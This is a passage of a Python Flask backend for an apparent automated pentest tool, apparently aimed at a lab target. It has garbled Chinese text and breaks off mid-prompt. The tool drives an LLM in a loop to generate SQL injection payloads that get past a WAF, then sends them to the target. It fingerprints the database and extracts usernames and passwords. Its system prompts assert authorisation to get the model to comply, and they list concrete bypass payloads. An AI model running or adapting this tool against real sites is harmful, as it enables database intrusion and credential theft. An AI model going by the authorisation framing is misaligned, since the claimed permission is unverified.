#!/usr/bin/env python3
"""
AutoPentest Web UI åç«¯
æä¾›æ¸—é€æµ‹è¯•çš„ Web ç•Œé¢
"""

import sys
import os

# æ·»åŠ çˆ¶ç›®å½•åˆ°è·¯å¾„
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flask import Flask, render_template, jsonify, request
import threading
import uuid
from datetime import datetime
import json

app = Flask(__name__, template_folder='../vulnerable-lab/templates')

# å­˜å‚¨æµ‹è¯•çŠ¶æ€
tests = {}


class WebUILogger:
    """Web UI æ—¥å¿—è®°å½•å™¨"""

    def __init__(self, test_id):
        self.test_id = test_id
        self.events = []
        self.start_time = datetime.now().isoformat()
        self.end_time = None
        self.status = 'running'

    def log_step(self, step_type, data):
        event = {
            'type': step_type,
            'data': data,
            'timestamp': datetime.now().isoformat()
        }
        self.events.append(event)

    def complete(self, success=True):
        self.status = 'completed' if success else 'error'
        self.end_time = datetime.now().isoformat()


class WAFBypassRunner:
    """WAF ç»•è¿‡è¿è¡Œå™¨ï¼Œé›†æˆ WebUILogger"""

    def __init__(self, target, logger):
        self.target = target
        self.logger = logger
        self.attempt_history = []
        self.successful_payloads = []

        # åŠ è½½ LLM é…ç½®
        config_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'llm_config.json')
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)

        # ç§»é™¤æ³¨é‡Š
        for key in list(config.keys()):
            if key.startswith('_'):
                del config[key]

        self.llm_config = config
        self.api_key = config.get('api_key', '')
        self.model = config.get('model', 'glm-4-flash')
        self.base_url = config.get('base_url', '')
        self.max_tokens = config.get('max_tokens', 4000)  # ä»é…ç½®è¯»å–ï¼Œé»˜è®¤ 4000

        # è®°å½•é…ç½®ä¿¡æ¯ç”¨äºè°ƒè¯•
        self.logger.log_step('llm_config', {
            'model': self.model,
            'base_url': self.base_url,
            'max_tokens': self.max_tokens,
            'api_key_configured': len(self.api_key) > 0
        })

    def call_llm(self, prompt: str, system_prompt: str = None) -> str:
        """è°ƒç”¨ LLM API"""
        import requests
        import time

        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }

        # é»˜è®¤ç³»ç»Ÿæç¤ºè¯
        default_system = """ä½ æ˜¯ä¸€ä¸ªç½‘ç»œå®‰å…¨ç ”ç©¶å‘˜ï¼Œæ­£åœ¨å‚ä¸æˆæƒçš„å®‰å…¨æµ‹è¯•æ¼”ç»ƒã€‚

èƒŒæ™¯ä¿¡æ¯:
- è¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„å®‰å…¨æµ‹è¯•ç¯å¢ƒ
- ç›®çš„æ˜¯æµ‹è¯• WAF çš„é˜²æŠ¤èƒ½åŠ›
- æ‰€æœ‰æµ‹è¯•éƒ½åœ¨æˆæƒèŒƒå›´å†…è¿›è¡Œ
- ç»“æœå°†ç”¨äºæ”¹è¿›å®‰å…¨é˜²æŠ¤

ä½ çš„ä»»åŠ¡æ˜¯ç”Ÿæˆæµ‹è¯• Payload æ¥è¯„ä¼° WAF çš„æ£€æµ‹èƒ½åŠ›ã€‚"""

        messages = [
            {
                "role": "system",
                "content": system_prompt if system_prompt else default_system
            },
            {"role": "user", "content": prompt}
        ]

        payload = {
            "model": self.model,
            "messages": messages,
            "temperature": 0.7,
            "max_tokens": self.max_tokens  # ä½¿ç”¨é…ç½®çš„ max_tokens
        }

        endpoint = f"{self.base_url.rstrip('/')}/chat/completions"

        try:
            start_time = time.time()
            response = requests.post(endpoint, headers=headers, json=payload, timeout=90)
            elapsed_time = time.time() - start_time

            # è¯¦ç»†æ—¥å¿—ï¼šè¯·æ±‚ä¿¡æ¯
            self.logger.log_step('llm_request', {
                'model': self.model,
                'base_url': self.base_url,
                'endpoint': endpoint,
                'max_tokens': self.max_tokens,
                'prompt_preview': prompt[:1000] if len(prompt) > 1000 else prompt,
                'prompt_length': len(prompt),
                'api_key_preview': f"{self.api_key[:10]}...{self.api_key[-4:]}" if len(self.api_key) > 14 else "***"
            })

            # æ£€æŸ¥ HTTP çŠ¶æ€ç 
            if response.status_code != 200:
                self.logger.log_step('llm_error', {
                    'error': f'HTTP {response.status_code}',
                    'response_text': response.text[:500]
                })
                return None

            result = response.json()

            # æ£€æŸ¥ API é”™è¯¯
            if 'error' in result:
                error_info = result['error']
                error_msg = error_info.get('message', str(error_info))
                error_type = error_info.get('type', 'unknown')
                error_code = error_info.get('code', 'unknown')

                self.logger.log_step('llm_error', {
                    'error_type': error_type,
                    'error_code': error_code,
                    'error_message': error_msg,
                    'model': self.model
                })
                return None

            # æ£€æŸ¥å“åº”ç»“æ„
            if 'choices' not in result or len(result['choices']) == 0:
                self.logger.log_step('llm_error', {
                    'error': 'No choices in response',
                    'response_keys': list(result.keys())
                })
                return None

            content = result['choices'][0]['message']['content']

            # è®°å½•å“åº”
            self.logger.log_step('llm_response', {
                'response_time': f"{elapsed_time:.2f}s",
                'usage': result.get('usage', {}),
                'response_preview': content[:200]
            })

            return content

        except requests.exceptions.Timeout:
            self.logger.log_step('llm_error', {
                'error': 'Request timeout after 90 seconds',
                'model': self.model
            })
            return None
        except requests.exceptions.ConnectionError as e:
            self.logger.log_step('llm_error', {
                'error': 'Connection error',
                'details': str(e),
                'base_url': self.base_url
            })
            return None
        except Exception as e:
            self.logger.log_step('llm_error', {
                'error': type(e).__name__,
                'details': str(e),
                'model': self.model
            })
            return None

    def _test_payload(self, endpoint, param_name, payload, method='GET'):
        """æµ‹è¯•å•ä¸ª payload"""
        import requests

        url = f"{self.target}{endpoint}"
        params = {param_name: payload}

        try:
            if method.upper() == 'GET':
                response = requests.get(url, params=params, timeout=10)
            else:
                response = requests.post(url, data=params, timeout=10)

            # è§£æå“åº”
            response_data = response.json() if response.content else {}

            # æ£€æµ‹æ˜¯å¦è¢« WAF é˜»æ­¢
            blocked = False
            waf_reason = None
            waf_stats = None

            if response_data.get('success') is False:
                # æ£€æŸ¥æ˜¯å¦æ˜¯ WAF é˜»æ­¢
                if 'WAF Blocked' in str(response_data) or 'WAF' in response_data.get('error', ''):
                    blocked = True
                    waf_reason = response_data.get('error', 'Unknown')
                    waf_stats = response_data.get('waf_stats')

            return {
                'blocked': blocked,
                'waf_reason': waf_reason,
                'waf_stats': waf_stats,
                'status_code': response.status_code,
                'response': response_data,
                'url': response.url,
                'payload': payload,
                'full_url': response.url
            }
        except Exception as e:
            return {
                'blocked': True,
                'error': str(e),
                'url': url,
                'payload': payload,
                'full_url': f"{url}?{param_name}={payload}"
            }

    def _analyze_failures(self, attempt_history):
        """è®© LLM åˆ†æå¤±è´¥åŸå› å¹¶ç”Ÿæˆæ–°çš„ç­–ç•¥"""
        # æ„å»ºå¤±è´¥å†å²æ‘˜è¦
        failure_summary = []
        for attempt in attempt_history[-5:]:  # æœ€è¿‘5æ¬¡å¤±è´¥
            failure_summary.append(f"""
- å°è¯• {attempt.get('iteration')}:
  Payload: {attempt.get('payload', '')[:100]}
  æŠ€æœ¯: {attempt.get('technique', 'Unknown')}
  é˜»æ­¢åŸå› : {attempt.get('waf_reason', 'Unknown')}
""")

        analysis_prompt = f"""ä½ æ˜¯ä¸€ä¸ªç½‘ç»œå®‰å…¨ä¸“å®¶ï¼Œæ­£åœ¨è¿›è¡Œæˆæƒçš„ WAF ç»•è¿‡æµ‹è¯•ã€‚

## å½“å‰æƒ…å†µ
å·²å°è¯• {len(attempt_history)} æ¬¡ï¼Œå…¨éƒ¨è¢« WAF é˜»æ­¢ã€‚

## æœ€è¿‘å¤±è´¥è®°å½•ï¼š
{''.join(failure_summary)}

## ä½ çš„ä»»åŠ¡
è¯·è¿›è¡Œæ·±åº¦åˆ†æå¹¶å›ç­”ä»¥ä¸‹é—®é¢˜ï¼š

1. **WAF ç‰¹å¾åˆ†æ**: æ ¹æ®é˜»æ­¢åŸå› ï¼Œæ¨æµ‹ WAF ä½¿ç”¨äº†å“ªäº›æ£€æµ‹è§„åˆ™ï¼Ÿ
2. **å¤±è´¥åŸå› **: ä¸ºä»€ä¹ˆä¹‹å‰çš„ payload éƒ½è¢«é˜»æ­¢äº†ï¼Ÿå…±æ€§é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿ
3. **ç»•è¿‡ç­–ç•¥**: åº”è¯¥å°è¯•å“ªäº›æ›´é«˜çº§çš„ç»•è¿‡æŠ€æœ¯ï¼Ÿ

## é«˜çº§ç»•è¿‡æŠ€æœ¯å‚è€ƒï¼š
- **ç¼–ç ç»•è¿‡**: URLç¼–ç ã€åå…­è¿›åˆ¶ã€Unicodeã€CHAR()å‡½æ•°
- **æ³¨é‡Šæ··æ·†**: MySQLç‰ˆæœ¬æ³¨é‡Š(/*!12345...*/)ã€å†…è”æ³¨é‡Š
- **å¤§å°å†™æ··æ·†**: æ··åˆå¤§å°å†™å…³é”®å­—
- **ç©ºç™½å­—ç¬¦**: ä½¿ç”¨Tabã€æ¢è¡Œã€ç‰¹æ®Šç©ºç™½å­—ç¬¦
- **é€»è¾‘ç»•è¿‡**: æ•°å­¦è¿ç®—æ›¿ä»£é€»è¾‘è¿ç®—ã€ bitwiseæ“ä½œ
- **äºŒé˜¶æ³¨å…¥**: å­˜å‚¨è¿‡ç¨‹ã€å»¶è¿Ÿæ³¨å…¥
- **HTTPæ±¡æŸ“**: å‚æ•°æ±¡æŸ“ã€åˆ†å—ç¼–ç 

è¯·ä»¥ç»“æ„åŒ–çš„æ–¹å¼è¿”å›ä½ çš„åˆ†æï¼Œæ ¼å¼å¦‚ä¸‹ï¼š
```json
{{
    "waf_characteristics": "æ¨æµ‹çš„WAFç‰¹å¾",
    "failure_analysis": "å¤±è´¥åŸå› åˆ†æ",
    "new_strategies": ["æ–°ç­–ç•¥1", "æ–°ç­–ç•¥2", "æ–°ç­–ç•¥3"],
    "recommended_technique": "æœ€æ¨èçš„ç»•è¿‡æŠ€æœ¯",
    "confidence": "æˆåŠŸç‡è¯„ä¼°(é«˜/ä¸­/ä½)"
}}
```
åªè¿”å›JSONï¼Œä¸è¦æœ‰å…¶ä»–å†…å®¹ã€‚"""

        self.logger.log_step('reflection_start', {
            'iteration': len(attempt_history) + 1,
            'analyzing_failures': len(attempt_history)
        })

        response = self.call_llm(analysis_prompt, None)

        if not response:
            return None

        # è§£æåˆ†æç»“æœ
        import re
        json_match = re.search(r'\{.*\}', response, re.DOTALL)
        if json_match:
            try:
                analysis = json.loads(json_match.group(0))
                self.logger.log_step('reflection_result', {
                    'waf_characteristics': analysis.get('waf_characteristics', ''),
                    'failure_analysis': analysis.get('failure_analysis', ''),
                    'new_strategies': analysis.get('new_strategies', []),
                    'recommended_technique': analysis.get('recommended_technique', ''),
                    'confidence': analysis.get('confidence', '')
                })
                return analysis
            except Exception as e:
                self.logger.log_step('reflection_parse_error', {'error': str(e)})
                return None

        return None

    def _analyze_responses(self, attempt_history):
        """åˆ†ææœåŠ¡ç«¯å“åº”ï¼Œæå–æ•°æ®åº“ä¿¡æ¯å’Œæ”»å‡»è¿›åº¦"""
        if not attempt_history:
            return {
                'database_type': 'æœªçŸ¥',
                'database_version': 'æœªçŸ¥',
                'field_count': 'æœªçŸ¥',
                'extracted_info': [],
                'sql_errors': [],
                'recent_errors': []
            }

        analysis = {
            'database_type': 'æœªçŸ¥',
            'database_version': 'æœªçŸ¥',
            'field_count': 'æœªçŸ¥',
            'extracted_info': [],
            'sql_errors': [],
            'recent_errors': []
        }

        for attempt in attempt_history:
            result = attempt.get('result', {})
            if result.get('blocked'):
                continue

            # åˆ†æå“åº”æ•°æ®
            response_data = result.get('response', {})
            data_list = response_data.get('data', [])
            status_code = result.get('status_code', 200)

            # ç¡®ä¿ data_list æ˜¯åˆ—è¡¨
            if not isinstance(data_list, list):
                data_list = []

            # æ£€æŸ¥å“åº”å†…å®¹
            response_str = str(response_data).lower()

            # â­ å…³é”®ï¼šæ•è· SQL é”™è¯¯ï¼ˆ500 å“åº”ï¼‰
            if status_code == 500 or status_code >= 400:
                error_message = response_data.get('error', '')
                query = response_data.get('query', '')

                if error_message:
                    error_detail = f"HTTP {status_code}: {error_message}"
                    if query:
                        error_detail += f" | Query: {query[:80]}"

                    # é¿å…é‡å¤æ·»åŠ ç›¸åŒé”™è¯¯
                    if error_detail not in analysis['sql_errors']:
                        analysis['sql_errors'].append(error_detail)

                    # è®°å½•æ‰€æœ‰é”™è¯¯ï¼Œåé¢åªå–æœ€æ–°çš„ 3 ä¸ª
                    if 'all_errors' not in analysis:
                        analysis['all_errors'] = []
                    analysis['all_errors'].append({
                        'status_code': status_code,
                        'error': error_message[:200],
                        'query': query[:100] if query else '',
                        'payload': attempt.get('payload', '')[:80],
                        'iteration': attempt.get('iteration', 0)
                    })

                # ä»é”™è¯¯æ¶ˆæ¯ä¸­è¯†åˆ«æ•°æ®åº“ç±»å‹
                error_lower = error_message.lower()
                if 'sqlite' in error_lower:
                    analysis['database_type'] = 'SQLite'
                elif 'mysql' in error_lower:
                    analysis['database_type'] = 'MySQL'
                elif 'postgresql' in error_lower or 'postgres' in error_lower:
                    analysis['database_type'] = 'PostgreSQL'
                elif 'mariadb' in error_lower:
                    analysis['database_type'] = 'MariaDB'

                # è¯†åˆ« SQLite ç‰¹æœ‰çš„é”™è¯¯æ¨¡å¼
                if 'no such function' in error_lower:
                    # SQLite ç‰¹æœ‰é”™è¯¯ï¼šno such function
                    if analysis['database_type'] == 'æœªçŸ¥':
                        analysis['database_type'] = 'SQLite'
                    if 'no such function: sql' not in analysis['sql_errors']:
                        analysis['sql_errors'].append('âš ï¸ æ£€æµ‹åˆ° SQLite è¯­æ³•é”™è¯¯ï¼šä½¿ç”¨äº†ä¸å­˜åœ¨çš„å‡½æ•°ï¼ˆå¦‚ sql()ï¼‰')
                elif 'syntax error' in error_lower:
                    if 'SQL è¯­æ³•é”™è¯¯' not in analysis['sql_errors']:
                        analysis['sql_errors'].append('âš ï¸ SQL è¯­æ³•é”™è¯¯ï¼Œå¯èƒ½æ˜¯æ•°æ®åº“ç±»å‹ä¸åŒ¹é…')

                continue  # è·³è¿‡æˆåŠŸå“åº”çš„åˆ†æ

            # æ•°æ®åº“ç±»å‹è¯†åˆ«ï¼ˆä»æˆåŠŸå“åº”ï¼‰
            if 'mysql' in response_str:
                analysis['database_type'] = 'MySQL'
            elif 'postgresql' in response_str or 'postgres' in response_str:
                analysis['database_type'] = 'PostgreSQL'
            elif 'sqlite' in response_str:
                analysis['database_type'] = 'SQLite'
            elif 'mariadb' in response_str:
                analysis['database_type'] = 'MariaDB'

            # ç‰ˆæœ¬ä¿¡æ¯æå–
            for item in data_list:
                if isinstance(item, dict):
                    # æ£€æŸ¥æ˜¯å¦åŒ…å«ç‰ˆæœ¬ä¿¡æ¯
                    for key, value in item.items():
                        value_str = str(value)
                        # æ£€æŸ¥å¸¸è§ç‰ˆæœ¬å­—ç¬¦ä¸²æ¨¡å¼
                        if any(x in value_str.lower() for x in ['version', 'mysql', 'postgresql', 'sqlite', 'mariadb']):
                            if value not in analysis['extracted_info']:
                                analysis['extracted_info'].append(f"æ•°æ®åº“ä¿¡æ¯: {value}")
                                if 'version' in value_str.lower():
                                    analysis['database_version'] = value_str

                        # æ£€æŸ¥ç”¨æˆ·ä¿¡æ¯
                        if any(x in value_str.lower() for x in ['user()', 'current_user', 'root@', 'localhost']):
                            if f"ç”¨æˆ·ä¿¡æ¯: {value}" not in analysis['extracted_info']:
                                analysis['extracted_info'].append(f"ç”¨æˆ·ä¿¡æ¯: {value}")

                        # æ£€æŸ¥æ•°æ®åº“å
                        if any(x in value_str.lower() for x in ['database()', 'current_database', 'schema']):
                            if f"æ•°æ®åº“: {value}" not in analysis['extracted_info']:
                                analysis['extracted_info'].append(f"æ•°æ®åº“: {value}")

                        # æ£€æŸ¥è¡¨åä¿¡æ¯
                        if 'information_schema' in value_str.lower() or 'pg_tables' in value_str.lower() or 'sqlite_master' in value_str.lower():
                            if f"ç³»ç»Ÿè¡¨: {value[:50]}" not in analysis['extracted_info']:
                                analysis['extracted_info'].append(f"ç³»ç»Ÿè¡¨è®¿é—®: {value[:50]}")

                        # æ£€æŸ¥æ˜¯å¦æˆåŠŸæå–å¯†ç 
                        if key == 'password' and value:
                            if f"å¯†ç æå–: {value[:20]}..." not in analysis['extracted_info']:
                                analysis['extracted_info'].append(f"å¯†ç æå–: {value[:20]}...")

                        # æ£€æŸ¥ username å­—æ®µ
                        if key == 'username' and value and ':' in str(value):
                            if f"åˆå¹¶æ•°æ®: {value[:30]}..." not in analysis['extracted_info']:
                                analysis['extracted_info'].append(f"åˆå¹¶æ•°æ®: {value[:30]}...")

            # æ¨æ–­å­—æ®µæ•°é‡
            if len(data_list) > 1:
                # UNION æ³¨å…¥æˆåŠŸï¼Œæ ¹æ®è¿”å›æ•°æ®æ¨æ–­
                first_item = data_list[0]
                if isinstance(first_item, dict):
                    analysis['field_count'] = len(first_item)
                else:
                    # first_item ä¸æ˜¯å­—å…¸ï¼Œè®°å½•ç±»å‹ç”¨äºè°ƒè¯•
                    analysis['field_count'] = f'æœªçŸ¥ç±»å‹: {type(first_item).__name__}'

        # æå–æœ€æ–°çš„ 1 ä¸ªé”™è¯¯
        if 'all_errors' in analysis:
            analysis['recent_errors'] = [analysis['all_errors'][-1]] if analysis['all_errors'] else []
            # ç§»é™¤ä¸´æ—¶å­—æ®µ
            del analysis['all_errors']
        else:
            analysis['recent_errors'] = []

        return analysis

    def bypass_waf(self, endpoint: str, param_name: str, param_value: str,
                   method: str = 'GET', max_iterations: int = 5):
        """ä½¿ç”¨ LLM ç»•è¿‡ WAF"""

        # è®°å½•åˆå§‹ä¿¡æ¯
        self.logger.log_step('scan_start', {
            'target': f"{self.target}{endpoint}",
            'param_name': param_name,
            'max_iterations': max_iterations
        })

        # æµ‹è¯• WAF
        base_payload = "1' OR '1'='1"
        waf_test = self._test_payload(endpoint, param_name, base_payload, method)

        self.logger.log_step('waf_test', {
            'base_payload': base_payload,
            'waf_active': waf_test['blocked'],
            'waf_response': waf_test.get('response', {})
        })

        if not waf_test['blocked']:
            self.logger.log_step('scan_end', {'reason': 'WAF not active'})
            return {'success': False, 'reason': 'WAF not active'}

        # å¼€å§‹ LLM ç»•è¿‡æµ‹è¯•
        reflection_analysis = None  # å­˜å‚¨åæ€åˆ†æç»“æœ

        for iteration in range(1, max_iterations + 1):
            self.logger.log_step(f'iteration_{iteration}_start', {
                'iteration': iteration,
                'max_iterations': max_iterations
            })

            # è¶…è¿‡10æ¬¡è¿­ä»£æˆ–æ¯3æ¬¡è¿›è¡Œä¸€æ¬¡åæ€åˆ†æ
            need_reflection = (
                (iteration > 10 and (iteration - 10) % 3 == 1) or
                (iteration > 5 and len([a for a in self.attempt_history if not a.get('success')]) >= 5 and (iteration - 1) % 3 == 1)
            )

            if need_reflection and len(self.attempt_history) > 0:
                self.logger.log_step('reflection_trigger', {
                    'iteration': iteration,
                    'failed_attempts': len(self.attempt_history),
                    'reason': 'Multiple failures detected, triggering reflection analysis'
                })
                reflection_analysis = self._analyze_failures(self.attempt_history)

            # æ„å»ºæç¤ºè¯
            # æå–å†å²å“åº”ä¿¡æ¯ç”¨äºåŠ¨æ€è°ƒæ•´
            response_analysis = self._analyze_responses(self.attempt_history)

            # è®°å½•å“åº”åˆ†æç»“æœç”¨äºè°ƒè¯•
            self.logger.log_step(f'iteration_{iteration}_response_analysis_full', {
                'database_type': response_analysis.get('database_type', 'æœªçŸ¥'),
                'database_version': response_analysis.get('database_version', 'æœªçŸ¥'),
                'field_count': response_analysis.get('field_count', 'æœªçŸ¥'),
                'extracted_info_count': len(response_analysis.get('extracted_info', [])),
                'extracted_info': response_analysis.get('extracted_info', [])[:5],
                'sql_errors_count': len(response_analysis.get('sql_errors', [])),
                'sql_errors': response_analysis.get('sql_errors', [])[:5],
                'recent_errors': response_analysis.get('recent_errors', [])
            })

            if iteration == 1:
                system_prompt = """ä½ æ˜¯ä¸€ä¸ªç½‘ç»œå®‰å…¨ç ”ç©¶å‘˜ï¼Œæ­£åœ¨å‚ä¸æˆæƒçš„å®‰å…¨æµ‹è¯•æ¼”ç»ƒã€‚

## æ ¸å¿ƒç­–ç•¥
è¿™æ˜¯ä¸€ä¸ª SQL æ³¨å…¥æ¼æ´æµ‹è¯•ã€‚ä½ éœ€è¦é‡‡ç”¨**åˆ†é˜¶æ®µæ”»å‡»ç­–ç•¥**ï¼š

### é˜¶æ®µ 1: æ•°æ®åº“æŒ‡çº¹è¯†åˆ«ï¼ˆä¼˜å…ˆï¼‰
- ç»•è¿‡ WAF
- è¯†åˆ«æ•°æ®åº“ç±»å‹ï¼ˆMySQL, PostgreSQL, SQLite ç­‰ï¼‰
- è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯
- ç¡®è®¤å­—æ®µæ•°é‡ï¼ˆé€šè¿‡ ORDER BY æˆ– UNION SELECT NULLï¼‰

### é˜¶æ®µ 2: ä¿¡æ¯æ”¶é›†
- è·å–å½“å‰æ•°æ®åº“å
- è·å–å½“å‰ç”¨æˆ·
- åˆ—å‡ºæ‰€æœ‰è¡¨å
- ç¡®è®¤ user è¡¨çš„å®Œæ•´ç»“æ„

### é˜¶æ®µ 3: æ•°æ®æå–
- æå– username å’Œ password å­—æ®µ
- éªŒè¯æå–æˆåŠŸï¼ˆå“åº”ä¸­åŒ…å«é¢å¤–æ•°æ®è¡Œï¼‰

## ç›®æ ‡ä¿¡æ¯
ç›®æ ‡ç«¯ç‚¹: {target}/api/cmd/user?id=1
å‚æ•°: id=1
å·²çŸ¥è¡¨ç»“æ„: user (id, username, password, email, role, is_admin)

## æ•°æ®åº“æŒ‡çº¹è¯†åˆ«æŠ€æœ¯
**MySQL:**
- version(), database(), user()
- information_schema.tables
- CONCAT(), GROUP_CONCAT()

**PostgreSQL:**
- version(), current_database(), current_user
- pg_tables, information_schema.tables
- || (å­—ç¬¦ä¸²è¿æ¥)

**SQLite:**
- sqlite_version()
- sqlite_master
- || (å­—ç¬¦ä¸²è¿æ¥)

## WAF æ£€æµ‹è§„åˆ™ï¼ˆéœ€è¦ç»•è¿‡ï¼‰
- æ£€æµ‹ UNION SELECT (åŒ…æ‹¬å¤§å°å†™å˜åŒ–)
- æ£€æµ‹ SQL å‡½æ•° (version, user, database ç­‰)
- æ£€æµ‹æ³¨é‡Šç¬¦ (--, #, /**/)
- æ£€æµ‹å•å¼•å·å’Œåˆ†å·

## ç»•è¿‡æŠ€æœ¯æ ˆ
1. **å†…è”æ³¨é‡Š**: 1/**/UNION/**/SELECT/**/1,2,3
2. **å¤§å°å†™æ··æ·†**: 1 UnIoN SeLeCt 1,2,3
3. **åŒé‡ç¼–ç **: 1%2520UNION%2520SELECT
4. **å‡½æ•°æ··æ·†**: ä½¿ç”¨ CONCAT() ç»•è¿‡å­—ç¬¦ä¸²æ£€æµ‹
5. **ç‰¹æ®Šå­—ç¬¦**: ä½¿ç”¨åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦
6. **æ•°å­¦è¿ç®—**: 1-1 UNION SELECT (å‡å·ä»£æ›¿ç©ºæ ¼)

## æˆåŠŸåˆ¤æ–­æ ‡å‡†
**ç»•è¿‡ WAF:** HTTP 200 ä¸”éé»˜è®¤é”™è¯¯å“åº”
**æŒ‡çº¹è¯†åˆ«æˆåŠŸ:** å“åº”åŒ…å«æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯
**æ•°æ®æå–æˆåŠŸ:** å“åº”åŒ…å«é¢å¤–çš„æ•°æ®è¡Œï¼ˆUNION ç»“æœï¼‰

## âš ï¸ è¾“å‡ºæ ¼å¼è¦æ±‚
ä½ å¿…é¡»ä¸”åªèƒ½è¿”å›ä¸€ä¸ª JSON å¯¹è±¡ï¼Œä¸è¦åŒ…å«ä»»ä½•å…¶ä»–æ–‡å­—ã€è§£é‡Šæˆ–æ ‡è®°ã€‚
æ ¼å¼å¿…é¡»ä¸¥æ ¼å¦‚ä¸‹ï¼š
{"payload": "å…·ä½“payload", "technique": "æŠ€æœ¯åç§°", "explanation": "ç®€çŸ­è¯´æ˜", "stage": "é˜¶æ®µ1/2/3"}

ä¸è¦ä½¿ç”¨ markdown ä»£ç å—ï¼Œä¸è¦æ·»åŠ ä»»ä½•å‰ç¼€æˆ–åç¼€ï¼Œç›´æ¥è¿”å› JSON å­—ç¬¦ä¸²ã€‚"""

                prompt = """è¯·ç”Ÿæˆç¬¬ä¸€ä¸ª SQL æ³¨å…¥ payloadï¼Œä¼˜å…ˆå°è¯•æ•°æ®åº“æŒ‡çº¹è¯†åˆ«ã€‚

å»ºè®®çš„åˆå§‹å°è¯•ï¼š
1. ç®€å•çš„æ•°å­—å‹æ³¨å…¥æµ‹è¯•: 1 AND 1=1
2. åŸºç¡€ UNION æ³¨å…¥: 1 UNION SELECT 1,2,3,4,5
3. å¸¦ç»•è¿‡çš„ UNION: 1/**/UNION/**/SELECT/**/1,2,3,4,5

ç›®æ ‡æ˜¯è¯†åˆ«æ•°æ®åº“ç±»å‹å’Œç»•è¿‡ WAFã€‚

âš ï¸ é‡è¦ï¼šåªè¿”å› JSON å¯¹è±¡ï¼Œæ ¼å¼ï¼š{"payload":"...", "technique":"...", "explanation":"...", "stage":"..."}
ä¸è¦æ·»åŠ ä»»ä½•å…¶ä»–æ–‡å­—ã€markdown æ ‡è®°æˆ–è§£é‡Šã€‚"""
            else:
                system_prompt = """ä½ æ˜¯ä¸€ä¸ªç½‘ç»œå®‰å…¨ç ”ç©¶å‘˜ï¼Œæ­£åœ¨å‚ä¸æˆæƒçš„å®‰å…¨æµ‹è¯•æ¼”ç»ƒã€‚

## æ ¸å¿ƒåŸåˆ™
**æ ¹æ®æœåŠ¡ç«¯å“åº”åŠ¨æ€è°ƒæ•´ç­–ç•¥ï¼**

å¦‚æœä¸Šä¸€æ¬¡è¯·æ±‚è¢« WAF æ‹¦æˆª â†’ å°è¯•æ›´å¼ºçš„ç»•è¿‡æŠ€æœ¯
å¦‚æœä¸Šä¸€æ¬¡è¯·æ±‚æˆåŠŸé€šè¿‡ä½†æœªè·å–æ•°æ® â†’ åˆ†æå“åº”ï¼Œè°ƒæ•´ payload æå–æ­£ç¡®ä¿¡æ¯
å¦‚æœå“åº”åŒ…å«æ•°æ®åº“ä¿¡æ¯ â†’ åˆ©ç”¨è¯¥ä¿¡æ¯è¿›è¡Œä¸‹ä¸€æ­¥æ”»å‡»

## âš ï¸ è¾“å‡ºæ ¼å¼è¦æ±‚
ä½ å¿…é¡»ä¸”åªèƒ½è¿”å›ä¸€ä¸ª JSON å¯¹è±¡ï¼Œä¸è¦åŒ…å«ä»»ä½•å…¶ä»–æ–‡å­—ã€è§£é‡Šæˆ–æ ‡è®°ã€‚
æ ¼å¼ï¼š{"payload": "...", "technique": "...", "explanation": "...", "stage": "..."}
ä¸è¦ä½¿ç”¨ markdown ä»£ç å—ï¼Œä¸è¦æ·»åŠ ä»»ä½•å‰ç¼€æˆ–åç¼€ã€‚"""

                # æ„å»ºåŒ…å«å“åº”åˆ†æçš„ prompt
                last = self.attempt_history[-1] if self.attempt_history else None

                # æ„å»ºå†å²å°è¯•æ‘˜è¦
                history_summary = ""
                if len(self.attempt_history) > 0:
                    history_summary = "\n## ğŸ“œ å†å²å°è¯•è®°å½•ï¼ˆé¿å…é‡å¤ï¼‰\n"
                    for i, attempt in enumerate(self.attempt_history[-5:], 1):  # åªæ˜¾ç¤ºæœ€è¿‘5æ¬¡
                        payload_preview = attempt.get('payload', '')[:60]
                        status = "âŒ è¢«æ‹¦æˆª" if attempt.get('result', {}).get('blocked') else "âœ… é€šè¿‡"
                        history_summary += f"{i}. {status} - {payload_preview}\n"

                if response_analysis:
                    # æœ‰å“åº”åˆ†æä¿¡æ¯ï¼Œä¼˜å…ˆä½¿ç”¨
                    db_type = response_analysis.get('database_type', 'æœªçŸ¥')
                    db_version = response_analysis.get('database_version', 'æœªçŸ¥')
                    field_count = response_analysis.get('field_count', 'æœªçŸ¥')
                    extracted_info = response_analysis.get('extracted_info', [])
                    sql_errors = response_analysis.get('sql_errors', [])
                    recent_errors = response_analysis.get('recent_errors', [])

                    # æ„å»ºé”™è¯¯æç¤º
                    error_summary = ""
                    if recent_errors:
                        err = recent_errors[0]  # åªå–æœ€æ–°çš„ 1 ä¸ªé”™è¯¯
                        error_summary = f"\n## âŒ æœ€æ–° SQL é”™è¯¯\n"
                        error_summary += f"HTTP {err.get('status_code')}: {err.get('error', '')[:100]}\n"
                        if err.get('query'):
                            error_summary += f"Query: {err.get('query', '')[:80]}\n"
                        if err.get('payload'):
                            error_summary += f"Payload: {err.get('payload', '')[:60]}\n"
                        error_summary += "\nâš ï¸ é‡è¦ï¼šæ ¹æ®ä¸Šè¿° SQL é”™è¯¯è°ƒæ•´ä½ çš„ payload è¯­æ³•ï¼\n"

                    prompt = f"""æˆæƒå®‰å…¨æµ‹è¯• - ç¬¬ {iteration} æ¬¡ SQL æ³¨å…¥å°è¯•

## ğŸ“Š å“åº”åˆ†æç»“æœ
**æ•°æ®åº“ç±»å‹:** {db_type}
**æ•°æ®åº“ç‰ˆæœ¬:** {db_version}
**å­—æ®µæ•°é‡:** {field_count}
**å·²æå–ä¿¡æ¯:**
{chr(10).join([f"  - {info}" for info in extracted_info]) if extracted_info else "  æš‚æ— "}
{error_summary}
{history_summary}

## ğŸ¯ å½“å‰é˜¶æ®µå»ºè®®
"""

                    # æ ¹æ®å·²è·å–çš„ä¿¡æ¯å†³å®šä¸‹ä¸€æ­¥
                    if db_type == 'æœªçŸ¥':
                        prompt += """**é˜¶æ®µ 1: æ•°æ®åº“æŒ‡çº¹è¯†åˆ«**
